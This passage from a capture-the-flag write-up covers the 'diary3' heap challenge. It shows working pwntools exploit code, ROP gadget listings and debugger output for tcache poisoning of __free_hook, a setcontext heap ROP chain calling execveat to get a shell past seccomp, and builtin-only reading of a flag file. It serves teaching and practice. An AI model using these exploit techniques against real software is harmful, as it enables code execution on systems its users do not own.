+<span class="code-dark-blue">0x563b8f3eabe0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eabf0</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac00</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac10</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac20</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac30</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac40</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac50</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac60</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac70</span>: 0x4141414141414141      0x4141414141414141
+<span class="code-dark-blue">0x563b8f3eac80</span>: 0x00000000000000f0      0x0000000000000100
+<span class="code-dark-blue">0x563b8f3eac90</span>: 0x0000000072657771      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eaca0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacb0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacc0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacd0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eace0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3eacf0</span>: 0x0000000000000000      0x0000000000000000
+<span class="code-dark-blue">0x563b8f3ead00</span>: 0x0000000000000000      0x0000000000000000
+</code></pre></div><p>So, the idea here is to perform a Tcache poisoning attack, since we can now free this <code>0x20</code>-sized chunk and edit the &ldquo;container&rdquo; chunk to modify the <code>fd</code> pointer. We will enter the address of <code>__free_hook</code> in order to allocate a chunk there and hijack the execution of <code>free</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">10</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk8">edit</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">9</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">10</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__free_hook)[:</span><span class="mtk6">7</span><span class="mtk1">])</span>  
+</code></pre></div><p>Notice that we cannot enter the full <code>__free_hook</code> address because <code>edit_dream</code> does not allow null bytes.</p><p>So we have entered <code>__free_hook</code> in the Tcache free-list:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>tcachebins
+<span class="code-dark-yellow">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span>
+<span class="code-dark-yellow">This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.</span>
+
+<span class="code-dark-blue">tcachebins</span>
+<span class="code-dark-yellow">0x20 [  1]</span>: <span class="code-dark-blue">0x5583b0dbeba0</span> —▸ <span class="code-dark-magenta">0x7f63a66205a8 (__free_hook)</span> ◂— ...
+<span class="code-dark-yellow">0x100 [  7]</span>: <span class="code-dark-blue">0x5583b0dbed90</span> —▸ <span class="code-dark-blue">0x5583b0dbee90</span> —▸ <span class="code-dark-blue">0x5583b0dbef90</span> —▸ <span class="code-dark-blue">0x5583b0dbf090</span> —▸ <span class="code-dark-blue">0x5583b0dbf190</span> —▸ <span class="code-dark-blue">0x5583b0dbf290</span> —▸ <span class="code-dark-blue">0x5583b0dbf390</span> ◂— 0x0  
+<span class="code-dark-yellow">0x410 [  1]</span>: <span class="code-dark-blue">0x5583b0dbd260</span> ◂— 0x0
+<span class="code-red">pwndbg&gt; </span>continue
+Continuing.
+</code></pre></div><p>Now we can allocate two <code>0x20</code>-sized chunks and write at <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './diary3'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./'</span>
+[<span class="code-green">+</span>] Starting local process './diary3': pid 3631968
+[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './diary3', '3631968', '-x', '/tmp/pwn7rw3qc5_.gdb']  
+[<span class="code-green">+</span>] Waiting for debugger: Done
+[<span class="code-blue">*</span>] Heap base address: 0x5583b0dbd000
+[<span class="code-green">+</span>] Glibc base address: 0x7f63a6439000
+[<span class="code-blue">*</span>] Switching to interactive mode
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; <span class="code-red">$</span> 1
+size: <span class="code-red">$</span> 24
+data: <span class="code-red">$</span> asdf
+done
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; <span class="code-red">$</span> 1
+size: <span class="code-red">$</span> 24
+data: <span class="code-red">$</span> ABCDEFG
+done
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; <span class="code-red">$</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>x/gx &__free_hook
+<span class="code-dark-blue">0x7f63a66205a8</span> &lt;<span class="code-dark-yellow">__free_hook</span>&gt;:   0x0a47464544434241  
+</code></pre></div><p>Perfect, now it is time to get code execution.</p><h3 id="rop-chain">ROP chain</h3><p>Remember that there were <code>secomp</code> rules enabled (actually, disallowed <code>syscall</code> instructions) and that Glibc does not contain the string <code>"/bin/sh"</code>, so <a href="https://github.com/david942j/one_gadget"><code>one_gadget</code></a> does not work here. Moreover, we can&rsquo;t use <code>system</code> because it uses <code>sys_fork</code> and <code>sys_execve</code> under the hood, and they are not allowed.</p><p>Also, remember that we have <code>sys_execveat</code> and <code>sys_openat</code>. The latter could have worked if we knew the filename to read the flag, but the challenge author said it was not guessable, so we are forced to obtain a shell with <code>sys_execveat</code>.</p><p>In order to call <code>sys_execveat</code>, we need to craft a ROP chain to set the registers accordingly (more information at <a href="https://man7.org/linux/man-pages/man2/execveat.2.html">man7.org</a>):</p><ul><li><code>$rax = 322</code></li><li><code>$rdi</code> contains a directory file descriptor (which is not used if the file to execute has an absolute path)</li><li><code>$rsi</code> has a pointer to the filename (prefered to be an absolute path)</li><li><code>$rdx</code> set to <code>NULL</code> (<code>argv</code> pointer)</li><li><code>$r10</code> set to <code>NULL</code> (<code>envp</code> pointer)</li><li><code>$r9 = 0</code> (<code>flags</code>)</li></ul><p>The problem here is that we do not have access to the stack, so it is difficult to get control of the instruction pointer to execute the ROP chain. Looking for possible ways to execute a ROP chain on the heap, I found <a href="https://lkmidas.github.io/posts/20210103-heap-seccomp-rop/">this write-up</a>. Fortunately, the walkthrough is very similar to this challenge: they need to use an open-read-write ROP chain on the heap to bypass <code>seccomp</code> rules.</p><p>The key is a function called <code>setcontext</code> in Glibc that contains a very useful gadget to set a lot of registers:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">objdump</span> -M intel --disassemble=setcontext <span class="mtku">libc.so.6</span>
+
+libc.so.6:     file format elf64-x86-64
+
+
+Disassembly of section .plt:
+
+Disassembly of section .plt.got:
+
+Disassembly of section .text:
+
+0000000000055e00 &lt;setcontext@@GLIBC_2.2.5&gt;:
+   55e00:       57                      push   rdi
+   55e01:       48 8d b7 28 01 00 00    lea    rsi,[rdi+0x128]
+   55e08:       31 d2                   xor    edx,edx
+   55e0a:       bf 02 00 00 00          mov    edi,0x2
+   55e0f:       41 ba 08 00 00 00       mov    r10d,0x8
+   55e15:       b8 0e 00 00 00          mov    eax,0xe
+   55e1a:       0f 05                   syscall
+   55e1c:       5a                      pop    rdx
+   55e1d:       48 3d 01 f0 ff ff       cmp    rax,0xfffffffffffff001
+   55e23:       73 5b                   jae    55e80 &lt;setcontext@@GLIBC_2.2.5+0x80&gt;
+   55e25:       48 8b 8a e0 00 00 00    mov    rcx,QWORD PTR [rdx+0xe0]
+   55e2c:       d9 21                   fldenv [rcx]
+   55e2e:       0f ae 92 c0 01 00 00    ldmxcsr DWORD PTR [rdx+0x1c0]
+   55e35:       48 8b a2 a0 00 00 00    mov    rsp,QWORD PTR [rdx+0xa0]
+   55e3c:       48 8b 9a 80 00 00 00    mov    rbx,QWORD PTR [rdx+0x80]
+   55e43:       48 8b 6a 78             mov    rbp,QWORD PTR [rdx+0x78]
+   55e47:       4c 8b 62 48             mov    r12,QWORD PTR [rdx+0x48]
+   55e4b:       4c 8b 6a 50             mov    r13,QWORD PTR [rdx+0x50]
+   55e4f:       4c 8b 72 58             mov    r14,QWORD PTR [rdx+0x58]
+   55e53:       4c 8b 7a 60             mov    r15,QWORD PTR [rdx+0x60]
+   55e57:       48 8b 8a a8 00 00 00    mov    rcx,QWORD PTR [rdx+0xa8]
+   55e5e:       51                      push   rcx
+   55e5f:       48 8b 72 70             mov    rsi,QWORD PTR [rdx+0x70]
+   55e63:       48 8b 7a 68             mov    rdi,QWORD PTR [rdx+0x68]
+   55e67:       48 8b 8a 98 00 00 00    mov    rcx,QWORD PTR [rdx+0x98]
+   55e6e:       4c 8b 42 28             mov    r8,QWORD PTR [rdx+0x28]
+   55e72:       4c 8b 4a 30             mov    r9,QWORD PTR [rdx+0x30]
+   55e76:       48 8b 92 88 00 00 00    mov    rdx,QWORD PTR [rdx+0x88]
+   55e7d:       31 c0                   xor    eax,eax
+   55e7f:       c3                      ret
+   55e80:       48 8b 0d e9 df 18 00    mov    rcx,QWORD PTR [rip+0x18dfe9]        # 1e3e70 &lt;h_errlist@@GLIBC_2.2.5+0xdd0&gt;  
+   55e87:       f7 d8                   neg    eax
+   55e89:       64 89 01                mov    DWORD PTR fs:[rcx],eax
+   55e8c:       48 83 c8 ff             or     rax,0xffffffffffffffff
+   55e90:       c3                      ret
+
+Disassembly of section __libc_freeres_fn:
+</code></pre></div><p>This gadget (<code>setcontext + 0x35</code>) is useful as long as we have control over <code>$rdx</code>.</p><p>By using <code>__free_hook</code> we have control over <code>$rdi</code> because it is where the first argument of <code>free</code> is stored. There is another gadget to control <code>$rdx</code> provided that we control <code>$rdi</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': mov rdx, qword ptr \[rdi'</span>
+0x0000000000093806 <span class="code-red">: mov rdx, qword ptr [rdi</span> + 0x28] ; mov qword ptr [rdx + 0x20], rax ; jmp 0x937d6
+0x0000000000150550 <span class="code-red">: mov rdx, qword ptr [rdi</span> + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]  
+0x0000000000136125 <span class="code-red">: mov rdx, qword ptr [rdi</span> + 8] ; mov rcx, qword ptr [rdi + 0x10] ; jmp 0x135f23
+0x0000000000107e68 <span class="code-red">: mov rdx, qword ptr [rdi</span>] ; jmp 0x107d3f
+</code></pre></div><p>We are interested in:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">0x0000000000150550 : mov rdx, qword ptr [rdi + 8] ; mov qword ptr [rsp], rax ; call qword ptr [rdx + 0x20]  
+</code></pre></div><p>With this one, we can set <code>$rdx</code> to the value at <code>$rdi + 8</code> and then call the address at <code>$rdx + 0x20</code> (that is <code>$rdi + 0x28</code>).</p><p>So, we will try to call the gadget from <code>setcontext</code> using the above one to set a ton of registers relative to <code>$rdx</code>. However, there are some registers that are not setup, so we have to set <code>$rsp</code> accordingly to return to a second ROP chain that will be placed on the heap to set <code>$rax</code>, <code>$r10</code> and call <code>syscall</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': pop r.. ; ret$'</span>  
+0x000000000012bda5 <span class="code-red">: pop r10 ; ret</span>
+0x0000000000030e4d <span class="code-red">: pop r12 ; ret</span>
+0x0000000000026a25 <span class="code-red">: pop r13 ; ret</span>
+0x0000000000026f9d <span class="code-red">: pop r14 ; ret</span>
+0x0000000000026541 <span class="code-red">: pop r15 ; ret</span>
+0x0000000000047cf8 <span class="code-red">: pop rax ; ret</span>
+0x00000000000253a6 <span class="code-red">: pop rbp ; ret</span>
+0x00000000000314f9 <span class="code-red">: pop rbx ; ret</span>
+0x000000000010b31e <span class="code-red">: pop rcx ; ret</span>
+0x0000000000026542 <span class="code-red">: pop rdi ; ret</span>
+0x000000000012bda6 <span class="code-red">: pop rdx ; ret</span>
+0x0000000000026f9e <span class="code-red">: pop rsi ; ret</span>
+0x0000000000030e4e <span class="code-red">: pop rsp ; ret</span>
+
+<span class="code-cyan">$</span> <span class="code-dark-green">ROPgadget</span> --binary <span class="mtku">libc.so.6</span> | <span class="code-dark-green">grep</span> <span class="code-dark-yellow">': syscall'</span>
+0x0000000000026bd4 <span class="code-red">: syscall
+</code></pre></div><p>So this is the code for the ROP chains:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">pop_rax_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">047cf8</span>
+<span class="mtk1">    </span><span class="mtk1">pop_r10_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">12bda5</span>
+<span class="mtk1">    </span><span class="mtk1">syscall_ret_addr</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">26bd4</span>
+
+<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_r10_ret_addr</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)    </span><span class="mtk3"># envp</span>
+<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">pop_rax_ret_addr</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk6">322</span><span class="mtk1">)  </span><span class="mtk3"># sys_execveat</span>
+<span class="mtk1">    </span><span class="mtk1">rop_chain</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">syscall_ret_addr</span><span class="mtk1">)</span>
+
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1">  </span><span class="mtk5">=</span><span class="mtk1"> p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1bc0</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.setcontext </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">35</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x28] = r8</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x30] = r9</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">                       </span><span class="mtk3"># padding</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x48] = r12</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x50] = r13</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x58] = r14</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x60] = r15</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x68] = rdi (dir_fd)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1ba0</span><span class="mtk1">)    </span><span class="mtk3"># &lt;-- [rdx + 0x70] = rsi (pointer to "/bin/sh")</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x78] = rbp</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x80] = rbx</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x88] = rdx (argv)</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1">                        </span><span class="mtk3"># padding</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk6">0</span><span class="mtk1">)                          </span><span class="mtk3"># &lt;-- [rdx + 0x98] = rcx</span>
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> p64(</span><span class="mtk1">heap_base_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">1bc8</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">payload</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">) </span><span class="mtk3"># &lt;-- [rdx + 0xa0] = rsp, pointing to ROP chain</span>  
+<span class="mtk1">    </span><span class="mtk1">payload</span><span class="mtk1"> </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk1">rop_chain</span><span class="mtk1">                       </span><span class="mtk3"># &lt;-- [rdx + 0xa8] = rcx, will be pushed</span>
+</code></pre></div><p>Some offsets must be taken from GDB while debugging. In order to trigger the ROP chain, we must enter the first gadget in <code>__free_hook</code> and call <code>free</code> with a chunk that contains values at offset <code>8</code> and <code>28</code> to call the gadget at <code>setcontext</code> and finally finish the ROP chain to call <code>sys_execveat</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">address</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">150550</span><span class="mtk1">))</span>  
+<span class="mtk1">    </span><span class="mtk8">write</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk7 mtki">0x</span><span class="mtk6">158</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'A'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">8</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk1">payload</span><span class="mtk1">)</span>
+<span class="mtk1">    </span><span class="mtk8">delete</span><span class="mtk1">(</span><span class="mtk1">p</span><span class="mtk1">, </span><span class="mtk6">13</span><span class="mtk1">)</span>
+</code></pre></div><p>After a lot of work, we successfully pop a shell:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span>
+[<span class="code-blue">*</span>] './diary3'
+    Arch:     amd64-64-little
+    RELRO:    <span class="code-dark-green">Full RELRO</span>
+    Stack:    <span class="code-dark-green">Canary found</span>
+    NX:       <span class="code-dark-green">NX enabled</span>
+    PIE:      <span class="code-dark-green">PIE enabled</span>
+    RUNPATH:  <span class="code-dark-red">b'./'</span>
+[<span class="code-green">+</span>] Starting local process './diary3': pid 3649245  
+[<span class="code-blue">*</span>] Heap base address: 0x562b6634f000
+[<span class="code-green">+</span>] Glibc base address: 0x7f4a1d167000
+[<span class="code-blue">*</span>] Switching to interactive mode
+<span class="code-red">$</span> ls
+Bad system call (core dumped)
+<span class="code-red">$</span> whoami
+Bad system call (core dumped)
+<span class="code-red">$</span> id
+Bad system call (core dumped)
+<span class="code-red">$</span> cat flag.txt
+Bad system call (core dumped)
+</code></pre></div><p>But&mldr; we can&rsquo;t execute commands because <code>seccomp</code> rules still block <code>sys_execve</code> and <code>sys_fork</code>. However, we can use shell built-in commands such as <code>echo</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">$</span> echo asdf
+asdf
+<span class="code-red">$</span> echo $PATH
+/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin  
+</code></pre></div><p>Also, we can list files with <code>echo *</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">$</span> echo *
+diary3 flag.txt ld-2.29.so libc.so.6 note.txt solve.py  
+</code></pre></div><p>And finally, we can use a <code>read</code> within a <code>while</code> loop to read a file passed with a redirector:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">$</span> while read line; do echo $line; done &lt; flag.txt  
+HTB{f4k3_fl4g_f0r_t35t1ng}
+</code></pre></div><p>More information on these tricks at <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/escaping-from-limited-bash">HackTricks</a>.</p><h2 id="flag">Flag</h2><p>To run the challenge remotely, we need to substract <code>0x410</code> to the base address of the heap because there is a freed chunk that appears in the local environment but does not appear when running behind <code>xinetd</code> service. I&rsquo;m talking about this chunk, which holds the banner string:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">gdb</span> -q <span class="mtku">diary3</span>
+Reading symbols from <span class="code-dark-green">diary3</span>...
+(No debugging symbols found in <span class="code-dark-green">diary3</span>)
+Use Pwndbg's <span class="code-dark-yellow">config</span> and <span class="code-dark-yellow">theme</span> commands to tune its configuration and theme colors!
+<span class="code-red">pwndbg&gt; </span>run
+Starting program: ./diary3
+Welcome to Dream Diary: Chapter 3!  The return of a Dream Diary with modern protections!  
+1. write about dream
+2. edit dream
+3. delete dream
+4. recount dream
+5. exit diary
+&gt; ^C
+Program received signal SIGINT, Interrupt.
+<span class="code-dark-blue">0x00007ffff7eedf81</span> in <span class="code-dark-yellow">read</span> () from <span class="code-dark-green">./libc.so.6</span>
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-red">pwndbg&gt; </span>vis_heap_chunks
+<span class="code-dark-yellow">pwndbg will try to resolve the heap symbols via heuristic now since we cannot resolve the heap via the debug symbols.</span>  
+<span class="code-dark-yellow">This might not work in all cases. Use `help set resolve-heap-via-heuristic` for more details.</span>
+
+
+0x55555555b000  <span class="code-dark-yellow">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000251</span>      <span class="code-dark-cyan">........Q.......</span>
+0x55555555b010  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b020  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+0x55555555b030  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
+...
+0x55555555b240  <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">0x0000000000000000</span>      <span class="code-dark-cyan">................</span>
